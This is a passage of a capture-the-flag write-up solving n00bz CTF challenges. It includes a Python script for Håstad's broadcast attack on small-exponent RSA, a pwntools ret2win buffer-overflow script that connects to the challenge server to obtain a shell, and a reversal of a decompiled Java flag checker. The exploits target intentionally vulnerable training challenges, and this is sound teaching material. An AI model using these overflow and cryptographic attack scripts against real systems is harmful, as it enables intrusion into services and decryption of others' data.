</span></code></pre><p>By the observations the <code>e=17</code> looks small. The message in RSA is simply the <code>e'th root of ct</code>, when the e is small enough it would be easy to compute without the private exponent.<p>Here the e=17 is small enough to do it,<p>17'th root of initial ct gave us the error, that is it has no perferct 17'th root.<p>But,<pre style=color:#61676c;background-color:#fafafa><code><span>1. Plaintext was same everytime
</span><span>2. Different modulus(n1,n2,..)
</span><span>3. Different ciphertext(c1,c2,..)
</span></code></pre><p>We can find the solution to the above system that is C which satisfies each equation<p>(C = c1 mod n1), (C = c2 mod n2),....<p>So, we can use the <code>Chinese Remaider Theorem</code> to solve for the common <code>C</code> which can fit in all the conditions.<p>After finding the <code>C</code> we can apply the 17'th root of <code>C</code> to get the plaintext.<p>Here is my solve.py<p><code>solve.py</code><pre class=language-python data-lang=python style=color:#61676c;background-color:#fafafa><code class=language-python data-lang=python><span style=color:#fa6e32>import </span><span>gmpy2
</span><span>gmpy2</span><span style=color:#ed9366>.</span><span style=color:#f29718>get_context</span><span>()</span><span style=color:#ed9366>.</span><span>precision </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>4096
</span><span>
</span><span style=color:#fa6e32>from </span><span>binascii </span><span style=color:#fa6e32>import </span><span>unhexlify
</span><span style=color:#fa6e32>from </span><span>functools </span><span style=color:#fa6e32>import </span><span style=color:#f07171>reduce
</span><span style=color:#fa6e32>from </span><span>gmpy2 </span><span style=color:#fa6e32>import </span><span>root
</span><span>
</span><span style=color:#abb0b6;font-style:italic># Håstad's Broadcast Attack
</span><span>
</span><span>EXPONENT </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>17
</span><span>
</span><span>c1 </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>7946043177938634894468433929073404673651875154647156508100839891449515149691686945995056602586944710327623300157734254965701993446310048878003244839505812174155025756246399456396630569716457360433801430476106400774865547279377861969979287733835750064754554220594527757651036422858155930651992095851602614627439063339245596216907989179295201194329197537828395638432777873627494874484442644162351506092674786914498798694380659404260196539645455287503433027367549309610352113572801657272668352732212443182638961092249449922085083328639368402363873369662072747755828243417869725889727969222941496766161784323302414216954
</span><span>c2 </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>12959573845685261486267397567112966488661691735414128259078491897996382414767291825628759526056897899253181537775863221611499490716812639282748479179124748696317221066942560992747945889171265338732860145466990785636517790722281378157380384521300704615814738956601099155119020464363668056528769776407040455062919016852662191860740902289863302299951158808734895396092718815039921735596667791228501328047526301396156478459414130901590537241875751813223439101873009005799006566824944416318134509872895247494905723306736031607559813033586425623787957866825634139736990176386467235744665177488925198627943203730320042768887
</span><span>n1 </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>17034440041769803013819987353259492052814047368802180553596332096232727428488407203629163872404893931800862659994426997044166691466452481674980731442588400925186076344115666523148148851729508568172248290848201341876249300702580615286136569268722103616878519428285998872272711491239079124967747524881729763554344521296227022124958916574705766479633287283765067948684030317008945004545691849344955755112782085223696765257525483464996334206039708539941173320021312903082525289861923741817167776417841751055018102296324303346467734670876150247432996078826945704561216298507441793730648326675429211605408858351177990334143
</span><span>n2 </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>17331299556630461029385232478393964321767599062981408558650170147730226667533079244038574631307826365292089835102067792983012928286988717407754509869684529210063898492076207785486047907744775354150474153932697409696268275174493130991110443360842923132578722743840846113197396873571123689245296146539892440667216842709178563761357112687102468939184745813114523671087689869743503793819274991554446204103603913471104472290485745834733456528879928652595610724965467569123797267442161308276102082738205391230941134328580245092921418147467984772008789925177804751341454022407072603374059077834470295173426162921767901044463
</span><span>
</span><span style=color:#fa6e32>def </span><span style=color:#f29718>chinese_remainder_theorem</span><span>(</span><span style=color:#ff8f40>items</span><span>):
</span><span>    </span><span style=color:#abb0b6;font-style:italic># Determine N, the product of all n_i
</span><span>    N </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>1
</span><span>    </span><span style=color:#fa6e32>for </span><span>a</span><span style=color:#61676ccc>, </span><span>n </span><span style=color:#fa6e32>in </span><span>items:
</span><span>        N </span><span style=color:#ed9366>*= </span><span>n
</span><span>
</span><span>    </span><span style=color:#abb0b6;font-style:italic># Find the solution (mod N)
</span><span>    result </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>0
</span><span>    </span><span style=color:#fa6e32>for </span><span>a</span><span style=color:#61676ccc>, </span><span>n </span><span style=color:#fa6e32>in </span><span>items:
</span><span>        m </span><span style=color:#ed9366>= </span><span>N </span><span style=color:#ed9366>// </span><span>n
</span><span>        r, s, d </span><span style=color:#ed9366>= </span><span style=color:#f29718>extended_gcd</span><span>(n</span><span style=color:#61676ccc>, </span><span>m)
</span><span>        </span><span style=color:#fa6e32>if </span><span>d </span><span style=color:#ed9366>!= </span><span style=color:#ff8f40>1</span><span>:
</span><span>            </span><span style=color:#fa6e32>raise </span><span style=color:#86b300>"Input not pairwise co-prime"
</span><span>        result </span><span style=color:#ed9366>+= </span><span>a </span><span style=color:#ed9366>* </span><span>s </span><span style=color:#ed9366>* </span><span>m
</span><span>
</span><span>    </span><span style=color:#abb0b6;font-style:italic># Make sure we return the canonical solution.
</span><span>    </span><span style=color:#fa6e32>return </span><span>result </span><span style=color:#ed9366>% </span><span>N
</span><span>
</span><span>
</span><span style=color:#fa6e32>def </span><span style=color:#f29718>extended_gcd</span><span>(</span><span style=color:#ff8f40>a</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>b</span><span>):
</span><span>    x, y </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>0</span><span>, </span><span style=color:#ff8f40>1
</span><span>    lastx, lasty </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>1</span><span>, </span><span style=color:#ff8f40>0
</span><span>
</span><span>    </span><span style=color:#fa6e32>while </span><span>b:
</span><span>        a, (q</span><span style=color:#61676ccc>, </span><span>b) </span><span style=color:#ed9366>= </span><span>b, </span><span style=color:#f07171>divmod</span><span>(a</span><span style=color:#61676ccc>, </span><span>b)
</span><span>        x, lastx </span><span style=color:#ed9366>= </span><span>lastx </span><span style=color:#ed9366>- </span><span>q </span><span style=color:#ed9366>* </span><span>x, x
</span><span>        y, lasty </span><span style=color:#ed9366>= </span><span>lasty </span><span style=color:#ed9366>- </span><span>q </span><span style=color:#ed9366>* </span><span>y, y
</span><span>
</span><span>    </span><span style=color:#fa6e32>return </span><span>(lastx</span><span style=color:#61676ccc>, </span><span>lasty</span><span style=color:#61676ccc>, </span><span>a)
</span><span>
</span><span>
</span><span style=color:#fa6e32>def </span><span style=color:#f29718>mul_inv</span><span>(</span><span style=color:#ff8f40>a</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>b</span><span>):
</span><span>    b0 </span><span style=color:#ed9366>= </span><span>b
</span><span>    x0, x1 </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>0</span><span>, </span><span style=color:#ff8f40>1
</span><span>    </span><span style=color:#fa6e32>if </span><span>b </span><span style=color:#ed9366>== </span><span style=color:#ff8f40>1</span><span>:
</span><span>        </span><span style=color:#fa6e32>return </span><span style=color:#ff8f40>1
</span><span>    </span><span style=color:#fa6e32>while </span><span>a </span><span style=color:#ed9366>> </span><span style=color:#ff8f40>1</span><span>:
</span><span>        q </span><span style=color:#ed9366>= </span><span>a </span><span style=color:#ed9366>// </span><span>b
</span><span>        a, b </span><span style=color:#ed9366>= </span><span>b, a </span><span style=color:#ed9366>% </span><span>b
</span><span>        x0, x1 </span><span style=color:#ed9366>= </span><span>x1 </span><span style=color:#ed9366>- </span><span>q </span><span style=color:#ed9366>* </span><span>x0, x0
</span><span>    </span><span style=color:#fa6e32>if </span><span>x1 </span><span style=color:#ed9366>< </span><span style=color:#ff8f40>0</span><span>:
</span><span>        x1 </span><span style=color:#ed9366>+= </span><span>b0
</span><span>    </span><span style=color:#fa6e32>return </span><span>x1
</span><span>
</span><span>
</span><span style=color:#fa6e32>if </span><span>__name__ </span><span style=color:#ed9366>== </span><span style=color:#86b300>'__main__'</span><span>:
</span><span>
</span><span>    C </span><span style=color:#ed9366>= </span><span style=color:#f29718>chinese_remainder_theorem</span><span>([(c1</span><span style=color:#61676ccc>, </span><span>n1)</span><span style=color:#61676ccc>, </span><span>(c2</span><span style=color:#61676ccc>, </span><span>n2)])
</span><span>    M </span><span style=color:#ed9366>= </span><span style=color:#55b4d4;font-style:italic>int</span><span>(</span><span style=color:#f29718>root</span><span>(C</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>17</span><span>))
</span><span>
</span><span>    M </span><span style=color:#ed9366>= </span><span style=color:#f07171>hex</span><span>(M)[</span><span style=color:#ff8f40>2</span><span style=color:#61676ccc>:</span><span>]
</span><span>    </span><span style=color:#f07171>print</span><span>(</span><span style=color:#f29718>unhexlify</span><span>(M)</span><span style=color:#ed9366>.</span><span style=color:#f29718>decode</span><span>(</span><span style=color:#86b300>'utf-8'</span><span>))
</span><span>
</span><span style=color:#abb0b6;font-style:italic># n00bz{5m4ll_3_1s_n3v3r_g00d!}
</span></code></pre><blockquote><p><code>Flag : n00bz{5m4ll_3_1s_n3v3r_g00d!}</code></blockquote><hr><h1 id=pwn><a aria-label="Anchor link for: pwn" class=zola-anchor href=#pwn>PWN</a></h1><p>Description :<pre class=language-text data-lang=text style=color:#61676c;background-color:#fafafa><code class=language-text data-lang=text><span>Welcome to the series of 3 pwn challenges!
</span><span>
</span><span>Challenge : nc challs.n00bzunit3d.xyz 35932
</span><span>Attached Files : [pwn1]
</span></code></pre><p>By disasembling pwn1 binary in Binary Ninja, get to know that there were a <code>win()</code> function which is not called by any method. But by calling the win() will give us the shell of the system.<p>Here is the objdump of pwn1<pre class=language-sh data-lang=sh style=color:#61676c;background-color:#fafafa><code class=language-sh data-lang=sh><span style=color:#f29718>mj0ln1r@Linux:/$</span><span> objdump</span><span style=color:#ff8f40> -d</span><span> pwn1
</span><span>
</span><span style=color:#f29718>00000000004011fb </span><span style=color:#ed9366><</span><span>main</span><span style=color:#ed9366>></span><span>:
</span><span>  </span><span style=color:#f29718>4011fb:</span><span>	f3 0f 1e fa          	endbr64 
</span><span>  </span><span style=color:#f29718>4011ff:</span><span>	55                   	push   %rbp
</span><span>  </span><span style=color:#f29718>401200:</span><span>	48 89 e5             	mov    %rsp,%rbp
</span><span>  </span><span style=color:#f29718>401203:</span><span>	48 83 ec 40          	sub    $0x40,%rsp
</span><span>  </span><span style=color:#f29718>401207:</span><span>	b8 00 00 00 00       	mov    $0x0,%eax
</span><span>  </span><span style=color:#f29718>40120c:</span><span>	e8 85 ff ff ff       	call   401196 </span><span style=color:#ed9366><</span><span>init</span><span style=color:#ed9366>>
</span><span>  </span><span style=color:#f29718>401211:</span><span>	48 8d 05 ec 0d 00 00 	lea    0xdec(%rip)</span><span style=color:#f29718>,%</span><span>rax        </span><span style=color:#abb0b6;font-style:italic># 402004 <_IO_stdin_used+0x4>
</span><span>  </span><span style=color:#f29718>401218:</span><span>	48 89 c7             	mov    %rax,%rdi
</span><span>  </span><span style=color:#f29718>40121b:</span><span>	e8 50 fe ff ff       	call   401070 </span><span style=color:#ed9366><</span><span>puts@plt</span><span style=color:#ed9366>>
</span><span>  </span><span style=color:#f29718>401220:</span><span>	48 8b 15 49 2e 00 00 	mov    0x2e49(%rip)</span><span style=color:#f29718>,%</span><span>rdx        </span><span style=color:#abb0b6;font-style:italic># 404070 &LTstdin@GLIBC_2.2.5>
</span><span>  </span><span style=color:#f29718>401227:</span><span>	48 8d 45 c0          	lea</span><span style=color:#ff8f40>    -0x40</span><span>(%rbp)</span><span style=color:#f29718>,%</span><span>rax
</span><span>  </span><span style=color:#f29718>40122b:</span><span>	be 50 00 00 00       	mov    $0x50,%esi
</span><span>  </span><span style=color:#f29718>401230:</span><span>	48 89 c7             	mov    %rax,%rdi
</span><span>  </span><span style=color:#f29718>401233:</span><span>	e8 58 fe ff ff       	call   401090 </span><span style=color:#ed9366><</span><span>fgets@plt</span><span style=color:#ed9366>>
</span><span>  </span><span style=color:#f29718>401238:</span><span>	48 8d 05 dc 0d 00 00 	lea    0xddc(%rip)</span><span style=color:#f29718>,%</span><span>rax        </span><span style=color:#abb0b6;font-style:italic># 40201b <_IO_stdin_used+0x1b>
</span><span>  </span><span style=color:#f29718>40123f:</span><span>	48 89 c7             	mov    %rax,%rdi
</span><span>  </span><span style=color:#f29718>401242:</span><span>	e8 39 fe ff ff       	call   401080 </span><span style=color:#ed9366><</span><span>system@plt</span><span style=color:#ed9366>>
</span><span>  </span><span style=color:#f29718>401247:</span><span>	90                   	nop
</span><span>  </span><span style=color:#f29718>401248:</span><span>	c9                   	leave  
</span><span>  </span><span style=color:#f29718>401249:</span><span>	c3                   	ret    
</span><span>
</span><span style=color:#f29718>000000000040124a </span><span style=color:#ed9366><</span><span>win</span><span style=color:#ed9366>></span><span>:
</span><span>  </span><span style=color:#f29718>40124a:</span><span>	f3 0f 1e fa          	endbr64 
</span><span>  </span><span style=color:#f29718>40124e:</span><span>	55                   	push   %rbp
</span><span>  </span><span style=color:#f29718>40124f:</span><span>	48 89 e5             	mov    %rsp,%rbp
</span><span>  </span><span style=color:#f29718>401252:</span><span>	57                   	push   %rdi
</span><span>  </span><span style=color:#f29718>401253:</span><span>	48 8d 05 d3 0d 00 00 	lea    0xdd3(%rip)</span><span style=color:#f29718>,%</span><span>rax        </span><span style=color:#abb0b6;font-style:italic># 40202d <_IO_stdin_used+0x2d>
</span><span>  </span><span style=color:#f29718>40125a:</span><span>	48 89 c7             	mov    %rax,%rdi
</span><span>  </span><span style=color:#f29718>40125d:</span><span>	e8 1e fe ff ff       	call   401080 </span><span style=color:#ed9366><</span><span>system@plt</span><span style=color:#ed9366>>
</span><span>  </span><span style=color:#f29718>401262:</span><span>	90                   	nop
</span><span>  </span><span style=color:#f29718>401263:</span><span>	5d                   	pop    %rbp
</span><span>  </span><span style=color:#f29718>401264:</span><span>	c3                   	ret    
</span></code></pre><p>So, It is a <code>ret2win</code> challenge.<p>Observations :<pre style=color:#61676c;background-color:#fafafa><code><span>1. The offset size was 64 (By trail and error check for segementation fault)
</span><span>2. Return instruction address in main `0x401249`
</span><span>3. Address of win() `0x40124a`
</span><span>4. The binary followed little-endian format.
</span></code></pre><p>So, we have to send the offset first combined with the <code>ret</code> instruction address followed by <code>win()</code> address.<p>Here is the complete solve.py<p><code>solve.py</code><pre class=language-python data-lang=python style=color:#61676c;background-color:#fafafa><code class=language-python data-lang=python><span style=color:#fa6e32>from </span><span>pwn </span><span style=color:#fa6e32>import </span><span style=color:#ff8f40>*
</span><span>r </span><span style=color:#ed9366>= </span><span style=color:#f29718>remote</span><span>(</span><span style=color:#86b300>"challs.n00bzunit3d.xyz"</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>35932</span><span>)
</span><span>payload </span><span style=color:#ed9366>= </span><span style=color:#fa6e32>b</span><span style=color:#86b300>'A'</span><span style=color:#ed9366>*</span><span style=color:#ff8f40>64
</span><span>payload </span><span style=color:#ed9366>+= </span><span style=color:#f29718>p64</span><span>(</span><span style=color:#ff8f40>0x401249</span><span>) </span><span style=color:#abb0b6;font-style:italic># ret address 
</span><span>payload </span><span style=color:#ed9366>+=</span><span style=color:#f29718>p64</span><span>(</span><span style=color:#ff8f40>0x40124a</span><span>) </span><span style=color:#abb0b6;font-style:italic># address to win() function
</span><span style=color:#f07171>print</span><span>(payload)
</span><span>r</span><span style=color:#ed9366>.</span><span style=color:#f29718>sendline</span><span>(payload)
</span><span>r</span><span style=color:#ed9366>.</span><span style=color:#f29718>interactive</span><span>()
</span><span>
</span><span style=color:#abb0b6;font-style:italic># n00bz{PWN_1_Cl34r3d_n0w_0nt0_PWN_2!!!}
</span></code></pre><blockquote><p><code>Flag : n00bz{PWN_1_Cl34r3d_n0w_0nt0_PWN_2!!!}</code></blockquote><hr><h1 id=rev><a aria-label="Anchor link for: rev" class=zola-anchor href=#rev>REV</a></h1><h1 id=ezrev><a aria-label="Anchor link for: ezrev" class=zola-anchor href=#ezrev>EZrev</a></h1><p>Description :<pre class=language-text data-lang=text style=color:#61676c;background-color:#fafafa><code class=language-text data-lang=text><span>Rev is EZ!
</span><span>
</span><span>Attached Files : [EZrev.class]
</span></code></pre><p>Decompiled the EZrev.class file to EZrev.java<p><code>EZrev.java</code><pre class=language-java data-lang=java style=color:#61676c;background-color:#fafafa><code class=language-java data-lang=java><span style=color:#fa6e32>import </span><span style=color:#55b4d4;font-style:italic>java</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>util</span><span style=color:#ed9366>.</span><span style=color:#55b4d4;font-style:italic>Arrays</span><span style=color:#61676ccc>;
</span><span>
</span><span style=color:#abb0b6;font-style:italic>// 
</span><span style=color:#abb0b6;font-style:italic>// Decompiled by Procyon v0.5.36
</span><span style=color:#abb0b6;font-style:italic>// 
</span><span>
</span><span style=color:#fa6e32>public class </span><span style=color:#399ee6>EZrev
</span><span>{
</span><span>    </span><span style=color:#fa6e32>public static void </span><span style=color:#f29718>main</span><span>(</span><span style=color:#fa6e32>final </span><span style=color:#55b4d4;font-style:italic>String</span><span style=color:#fa6e32>[] </span><span style=color:#ff8f40>array</span><span>) {
</span><span>        </span><span style=color:#fa6e32>if </span><span>(array</span><span style=color:#ed9366>.</span><span>length </span><span style=color:#ed9366>!= </span><span style=color:#ff8f40>1</span><span>) {
</span><span>            </span><span style=color:#55b4d4;font-style:italic>System</span><span style=color:#ed9366>.</span><span>out</span><span style=color:#ed9366>.</span><span style=color:#f29718>println</span><span>(</span><span style=color:#86b300>"L"</span><span>)</span><span style=color:#61676ccc>;
</span><span>            </span><span style=color:#fa6e32>return</span><span style=color:#61676ccc>;
</span><span>        }
</span><span>        </span><span style=color:#fa6e32>final </span><span style=color:#55b4d4;font-style:italic>String</span><span> s </span><span style=color:#ed9366>=</span><span> array[</span><span style=color:#ff8f40>0</span><span>]</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#fa6e32>if </span><span>(s</span><span style=color:#ed9366>.</span><span style=color:#f29718>length</span><span>() </span><span style=color:#ed9366>!= </span><span style=color:#ff8f40>31</span><span>) {
</span><span>            </span><span style=color:#55b4d4;font-style:italic>System</span><span style=color:#ed9366>.</span><span>out</span><span style=color:#ed9366>.</span><span style=color:#f29718>println</span><span>(</span><span style=color:#86b300>"L"</span><span>)</span><span style=color:#61676ccc>;
</span><span>            </span><span style=color:#fa6e32>return</span><span style=color:#61676ccc>;
</span><span>        }
</span><span>        </span><span style=color:#fa6e32>final int[]</span><span> array2 </span><span style=color:#ed9366>=</span><span> s</span><span style=color:#ed9366>.</span><span style=color:#f29718>chars</span><span>()</span><span style=color:#ed9366>.</span><span style=color:#f29718>toArray</span><span>()</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#fa6e32>for </span><span>(</span><span style=color:#fa6e32>int</span><span> i </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>0</span><span style=color:#61676ccc>;</span><span> i </span><span style=color:#ed9366><</span><span> array2</span><span style=color:#ed9366>.</span><span>length</span><span style=color:#61676ccc>; </span><span style=color:#ed9366>++</span><span>i) {
</span><span>            </span><span style=color:#fa6e32>if </span><span>(i </span><span style=color:#ed9366>% </span><span style=color:#ff8f40>2 </span><span style=color:#ed9366>== </span><span style=color:#ff8f40>0</span><span>) {
</span><span>                array2[i] </span><span style=color:#ed9366>= </span><span>(</span><span style=color:#fa6e32>char</span><span>)(array2[i] </span><span style=color:#ed9366>^ </span><span style=color:#ff8f40>0x13</span><span>)</span><span style=color:#61676ccc>;
</span><span>            }
</span><span>            </span><span style=color:#fa6e32>else </span><span>{
</span><span>                array2[i] </span><span style=color:#ed9366>= </span><span>(</span><span style=color:#fa6e32>char</span><span>)(array2[i] </span><span style=color:#ed9366>^ </span><span style=color:#ff8f40>0x37</span><span>)</span><span style=color:#61676ccc>;
</span><span>            }
</span><span>        }
</span><span>        </span><span style=color:#fa6e32>for </span><span>(</span><span style=color:#fa6e32>int</span><span> j </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>0</span><span style=color:#61676ccc>;</span><span> j </span><span style=color:#ed9366><</span><span> array2</span><span style=color:#ed9366>.</span><span>length </span><span style=color:#ed9366>/ </span><span style=color:#ff8f40>2</span><span style=color:#61676ccc>; </span><span style=color:#ed9366>++</span><span>j) {
</span><span>            </span><span style=color:#fa6e32>if </span><span>(j </span><span style=color:#ed9366>% </span><span style=color:#ff8f40>2 </span><span style=color:#ed9366>== </span><span style=color:#ff8f40>0</span><span>) {
</span><span>                </span><span style=color:#fa6e32>final int</span><span> n </span><span style=color:#ed9366>=</span><span> array2[j] </span><span style=color:#ed9366>- </span><span style=color:#ff8f40>10</span><span style=color:#61676ccc>;
</span><span>                array2[j] </span><span style=color:#ed9366>= </span><span>(</span><span style=color:#fa6e32>char</span><span>)(array2[array2</span><span style=color:#ed9366>.</span><span>length </span><span style=color:#ed9366>- </span><span style=color:#ff8f40>1 </span><span style=color:#ed9366>-</span><span> j] </span><span style=color:#ed9366>+ </span><span style=color:#ff8f40>20</span><span>)</span><span style=color:#61676ccc>;
</span><span>                array2[array2</span><span style=color:#ed9366>.</span><span>length </span><span style=color:#ed9366>- </span><span style=color:#ff8f40>1 </span><span style=color:#ed9366>-</span><span> j] </span><span style=color:#ed9366>= </span><span>(</span><span style=color:#fa6e32>char</span><span>)n</span><span style=color:#61676ccc>;
</span><span>            }
</span><span>            </span><span style=color:#fa6e32>else </span><span>{
</span><span>                array2[j] </span><span style=color:#ed9366>= </span><span>(</span><span style=color:#fa6e32>char</span><span>)(array2[j] </span><span style=color:#ed9366>+ </span><span style=color:#ff8f40>30</span><span>)</span><span style=color:#61676ccc>;
</span><span>            }
</span><span>        }
</span><span>        </span><span style=color:#fa6e32>if </span><span>(</span><span style=color:#55b4d4;font-style:italic>Arrays</span><span style=color:#ed9366>.</span><span style=color:#f29718>equals</span><span>(array2</span><span style=color:#61676ccc>, </span><span style=color:#fa6e32>new int</span><span>[] { </span><span style=color:#ff8f40>130</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>37</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>70</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>115</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>64</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>106</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>143</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>34</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>54</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>134</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>96</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>98</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>125</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>98</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>138</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>104</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>25</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>3</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>66</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>78</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>24</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>69</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>91</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>80</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>87</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>67</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>95</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>8</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>25</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>22</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>115 </span><span>})) {
</span><span>            </span><span style=color:#55b4d4;font-style:italic>System</span><span style=color:#ed9366>.</span><span>out</span><span style=color:#ed9366>.</span><span style=color:#f29718>println</span><span>(</span><span style=color:#86b300>"W"</span><span>)</span><span style=color:#61676ccc>;
</span><span>        }
</span><span>        </span><span style=color:#fa6e32>else </span><span>{
</span><span>            </span><span style=color:#55b4d4;font-style:italic>System</span><span style=color:#ed9366>.</span><span>out</span><span style=color:#ed9366>.</span><span style=color:#f29718>println</span><span>(</span><span style=color:#86b300>"L"</span><span>)</span><span style=color:#61676ccc>;
</span><span>        }
</span><span>    }
</span><span>}
</span></code></pre><p>Observations :<pre style=color:#61676c;background-color:#fafafa><code><span>1. The command line input `String[] array` was passed to the main method.
</span><span>2. The input String array converted to a dictionary of number's 
</span><span>3. The converted number dictionary is then compared with { 130, 37, 70, 115, 64, 106, 143, 34, 54, 134, 96, 98, 125, 98, 138, 104, 25, 3, 66, 78, 24, 69, 91, 80, 87, 67, 95, 8, 25, 22, 115 }
</span><span>4. If the converted inputted string is equals to the above dictionary the check was successful.
</span><span>5. So, We have to reverse the dictionary of numbers which are used in the comparision in order to get the initial string characters.
</span></code></pre><p>We can see that the flag len is <code>31</code>. First we have to reverse the second for loop then the first for loop to get the flag characters.<p><code>solve.py</code><pre class=language-python data-lang=python style=color:#61676c;background-color:#fafafa><code class=language-python data-lang=python><span>final </span><span style=color:#ed9366>= </span><span>[</span><span style=color:#ff8f40>130</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>37</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>70</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>115</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>64</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>106</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>143</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>34</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>54</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>134</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>96</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>98</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>125</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>98</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>138</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>104</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>25</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>3</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>66</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>78</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>24</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>69</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>91</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>80</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>87</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>67</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>95</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>8</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>25</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>22</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>115</span><span>]
</span><span>
</span><span style=color:#fa6e32>for </span><span>j </span><span style=color:#fa6e32>in </span><span style=color:#f07171>range</span><span>(</span><span style=color:#f07171>len</span><span>(final)</span><span style=color:#ed9366>//</span><span style=color:#ff8f40>2</span><span>):
</span><span>    </span><span style=color:#fa6e32>if </span><span>j </span><span style=color:#ed9366>% </span><span style=color:#ff8f40>2 </span><span style=color:#ed9366>== </span><span style=color:#ff8f40>0</span><span>:
</span><span>        n </span><span style=color:#ed9366>= </span><span>final[j]</span><span style=color:#ed9366>-</span><span style=color:#ff8f40>20
</span><span>        final[j] </span><span style=color:#ed9366>= </span><span>final[</span><span style=color:#f07171>len</span><span>(final)</span><span style=color:#ed9366>-</span><span style=color:#ff8f40>1</span><span style=color:#ed9366>-</span><span>j] </span><span style=color:#ed9366>+ </span><span style=color:#ff8f40>10
</span><span>        final[</span><span style=color:#f07171>len</span><span>(final)</span><span style=color:#ed9366>-</span><span style=color:#ff8f40>1</span><span style=color:#ed9366>-</span><span>j] </span><span style=color:#ed9366>= </span><span>n
</span><span>    </span><span style=color:#fa6e32>else</span><span>:
</span><span>        final[j] </span><span style=color:#ed9366>= </span><span>final[j]</span><span style=color:#ed9366>-</span><span style=color:#ff8f40>30
</span><span style=color:#abb0b6;font-style:italic># print(final)
</span><span>
</span><span style=color:#fa6e32>for </span><span>i </span><span style=color:#fa6e32>in </span><span style=color:#f07171>range</span><span>(</span><span style=color:#f07171>len</span><span>(final)):
</span><span>    </span><span style=color:#fa6e32>if </span><span>i </span><span style=color:#ed9366>% </span><span style=color:#ff8f40>2 </span><span style=color:#ed9366>== </span><span style=color:#ff8f40>0</span><span>:
</span><span>        final[i] </span><span style=color:#ed9366>= </span><span>final[i] </span><span style=color:#ed9366>^ </span><span style=color:#ff8f40>0x13
</span><span>    </span><span style=color:#fa6e32>else</span><span>:
</span><span>        final[i] </span><span style=color:#ed9366>= </span><span>final[i] </span><span style=color:#ed9366>^ </span><span style=color:#ff8f40>0x37
</span><span>
</span><span style=color:#f07171>print</span><span>(final)
</span><span>
</span><span style=color:#fa6e32>for </span><span>i </span><span style=color:#fa6e32>in </span><span>final:
</span><span>    </span><span style=color:#f07171>print</span><span>(</span><span style=color:#f07171>chr</span><span>(i)</span><span style=color:#61676ccc>,</span><span style=color:#ff8f40>end</span><span style=color:#ed9366>=</span><span style=color:#86b300>""</span><span>)
</span><span>
